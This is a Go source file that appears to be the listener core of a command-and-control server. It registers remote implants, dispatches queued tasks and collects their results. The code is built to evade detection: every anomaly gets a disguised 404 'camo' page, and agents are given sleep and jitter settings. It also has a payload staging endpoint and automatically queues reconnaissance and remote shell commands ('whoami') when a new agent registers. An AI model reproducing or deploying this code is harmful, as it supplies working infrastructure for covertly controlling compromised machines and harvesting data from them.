package listener

import (
	"crypto/rsa"
	"encoding/json"
	"errors"
	"time"

	"wispp/protocol"
	"wispp/server/internal/core"
	"wispp/server/internal/guard"
	"wispp/server/internal/stage"
)

// errCamo tells the transport to answer with the benign 404 page — every
// anomaly (unknown session, bad MAC, junk frame) must be indistinguishable.
var errCamo = errors.New("reply-camo")

// Core holds the transport-independent Type1 message pipeline, shared by
// the HTTP (profile-shaped) and TCP (packet-framed) listeners (plan §2.2).
type Core struct {
	ID  string // listener id (session attribution)
	Hub *core.Hub
	// Harvest auto-enqueues these tasks on FIRST registration: harvest
	// before a short-lived session disappears (plan §2.2).
	Harvest      []HarvestTask
	PSK          string
	Priv         *rsa.PrivateKey
	SleepMS      int
	Jitter       int
	Project      string
	Guard        *guard.Ban
	RCPAdvertise func() string  // dynamic Type2 dial target (empty = none)
	Stage        *stage.Service // optional Type4 token-gated fetch endpoint (plan §2.5)
	// Compress zstd-compresses sealed envelopes this listener sends (plan P6,
	// profile-driven); incoming envelopes self-describe via the `z` flag.
	Compress bool
}

// Process handles one envelope and returns the reply envelope.
func (a *Core) Process(env *protocol.Envelope, ip string) (*protocol.Envelope, error) {
	switch env.Type {
	case protocol.MsgPubkey:
		return plain(protocol.MsgPubkey, "", protocol.PubkeyInfo{
			PEM: string(protocol.EncodePublicKeyPEM(&a.Priv.PublicKey)),
		})
	case protocol.MsgRegister:
		return a.onRegister(env, ip)
	case protocol.MsgCheckin:
		return a.onCheckin(env)
	case protocol.MsgResult:
		return a.onResult(env)
	default:
		return nil, errCamo
	}
}

// serverCaps is advertised in RegisterAck (plan P6 negotiation) so agents can
// detect available server-side features instead of failing silently.
var serverCaps = []string{"rcp", "stage", "profile", "poly", "fserver", "plugins"}

func (a *Core) onRegister(env *protocol.Envelope, ip string) (*protocol.Envelope, error) {
	var info protocol.RegisterInfo
	if err := env.DecodePlain(&info); err != nil || info.Agent == "" || env.Agent != info.Agent {
		a.Hub.Emit("err", "security", a.Project, "register parse failed from %s", ip)
		return nil, errCamo
	}
	// P6 replay protection: new agents carry ts+nonce; a captured register
	// envelope fails both the ±300s window and the one-shot nonce cache.
	// Legacy agents (ts=0) still work — their shape never changed.
	if info.TS != 0 {
		now := time.Now().Unix()
		if info.TS < now-protocol.RegisterMaxSkew || info.TS > now+protocol.RegisterMaxSkew {
			a.Hub.Emit("err", "security", a.Project,
				"register replay window violated (ts=%d) from %s", info.TS, ip)
			return nil, errCamo
		}
		if len(info.Nonce) < protocol.MinRegisterNonceLen || !guard.CheckRegisterNonce(info.Nonce) {
			a.Hub.Emit("err", "security", a.Project, "register replayed (nonce reused) from %s", ip)
			return nil, errCamo
		}
	} else {
		a.Hub.Emit("info", "security", a.Project, "legacy register without ts/nonce from %s", ip)
	}
	// P6 negotiation: an agent speaking a newer protocol gets an explicit
	// refusal (never a silent hang).
	if info.Proto > protocol.ProtocolVersion {
		return plain(protocol.MsgRegisterAck, info.Agent,
			protocol.RegisterAck{OK: false, Reason: "proto"})
	}
	sk, err := protocol.UnwrapSessionKey(a.Priv, info.WrappedKey)
	if err != nil {
		a.Hub.Emit("err", "security", a.Project, "register key unwrap failed (%s) from %s", info.Agent, ip)
		return nil, errCamo
	}
	if !protocol.VerifyPSKProof(a.PSK, info.Agent, sk.ID[:], info.PSKProof) {
		banned := false
		if a.Guard != nil {
			banned = a.Guard.Fail(ip)
		}
		// P6: never echo the failure — the request gets the profile's camo
		// 404; the real reason stays in the audit log.
		a.Hub.Emit("err", "security", a.Project, "PSK verification FAILED for agent %s from %s (ban=%v) — camo 404",
			info.Agent, ip, banned)
		return nil, errCamo
	}
	first := a.Hub.Register(info.Agent, a.Project, a.ID, sk, info.System, info.Caps...)
	ack := protocol.RegisterAck{OK: true, ServerNow: time.Now().Unix(), SleepMS: a.SleepMS,
		JitterPct: a.Jitter, GraceCycles: 3, Proto: protocol.ProtocolVersion, Caps: serverCaps}
	if a.RCPAdvertise != nil {
		if adv := a.RCPAdvertise(); adv != "" {
			ack.RCPAddr = adv
			ack.RPCToken = protocol.RCPToken(a.PSK, info.Agent)
		}
	}
	if first {
		a.Hub.Emit("ok", "session", a.Project, "new agent %s — %s@%s (%s %s)",
			info.Agent, info.System.User, info.System.Hostname, info.System.OS, info.System.Arch)
		for _, h := range a.Harvest {
			if _, err := a.Hub.Enqueue(info.Agent, h.Cmd, h.Args); err != nil {
				a.Hub.Emit("warn", "task", a.Project, "auto-harvest enqueue failed: %v", err)
			}
		}
	} else {
		a.Hub.Emit("info", "session", a.Project, "agent %s re-registered", info.Agent)
	}
	return plain(protocol.MsgRegisterAck, info.Agent, ack)
}

// openSealed opens an envelope with the live session key, falling back to the
// time-boxed rekey grace key (P6) before declaring the frame junk.
func (a *Core) openSealed(env *protocol.Envelope, out any) (*protocol.SessionKey, error) {
	if sk, ok := a.Hub.Key(env.Agent); ok {
		if err := env.OpenSealed(sk, out); err == nil {
			return sk, nil
		}
	}
	if gk, ok := a.Hub.GraceKey(env.Agent); ok {
		if err := env.OpenSealed(gk, out); err == nil {
			return gk, nil
		}
	}
	return nil, errors.New("session key rejected")
}

func (a *Core) onCheckin(env *protocol.Envelope) (*protocol.Envelope, error) {
	var hb protocol.Heartbeat
	sk, err := a.openSealed(env, &hb)
	if err != nil {
		if a.Guard != nil {
			a.Guard.Fail("agent:" + env.Agent)
		}
		a.Hub.Emit("err", "security", a.Hub.Project(env.Agent), "checkin open failed for %s: %v", env.Agent, err)
		return nil, errCamo
	}
	task, _, ok := a.Hub.Checkin(env.Agent, hb)
	if !ok {
		return nil, errCamo
	}
	var payload any
	if task != nil {
		payload = task
		a.Hub.Emit("info", "task", a.Hub.Project(env.Agent), "dispatched task %s (cmd=%d) to %s",
			task.ID, task.Cmd, core.ShortID(env.Agent))
	}
	return a.sealedZ(protocol.MsgCheckin, env.Agent, sk, payload)
}

func (a *Core) onResult(env *protocol.Envelope) (*protocol.Envelope, error) {
	var res protocol.TaskResult
	sk, err := a.openSealed(env, &res)
	if err != nil {
		a.Hub.Emit("err", "security", a.Hub.Project(env.Agent), "result open failed for %s: %v", env.Agent, err)
		return nil, errCamo
	}
	if err := a.Hub.Complete(env.Agent, res); err != nil {
		a.Hub.Emit("warn", "task", a.Hub.Project(env.Agent), "result rejected: %v", err)
	}
	return a.sealedZ(protocol.MsgResult, env.Agent, sk, map[string]bool{"ok": true})
}

// HarvestTask is one auto-exec entry {cmd, args-json}.
type HarvestTask struct {
	Cmd  uint32          `json:"cmd"`
	Args json.RawMessage `json:"args,omitempty"`
}

// DefaultHarvest is the built-in collection sequence (-autoharvest flag).
func DefaultHarvest() []HarvestTask {
	return []HarvestTask{
		{Cmd: protocol.CmdSysinfo},
		{Cmd: protocol.CmdPwd},
		{Cmd: protocol.CmdShell, Args: json.RawMessage(`{"command":"whoami"}`)},
	}
}

func plain(typ, agent string, payload any) (*protocol.Envelope, error) {
	return protocol.NewPlainEnvelope(typ, agent, payload)
}

// sealedZ seals a response envelope, zstd-compressing the inner JSON when the
// listener's profile enables it (plan P6). Incoming envelopes self-describe
// via the `z` flag, so receive-side decompression needs no configuration.
func (a *Core) sealedZ(typ, agent string, sk *protocol.SessionKey, payload any) (*protocol.Envelope, error) {
	return protocol.NewSealedEnvelopeZstd(typ, agent, sk, payload, a.Compress)
}

// Init wires shared dependencies; called by each transport's constructor path.
func (c *Core) Init(hub *core.Hub, psk string, priv *rsa.PrivateKey, sleepMS, jitter int, project string, ban *guard.Ban) {
	c.Hub, c.PSK, c.Priv, c.SleepMS, c.Jitter, c.Project, c.Guard = hub, psk, priv, sleepMS, jitter, project, ban
}
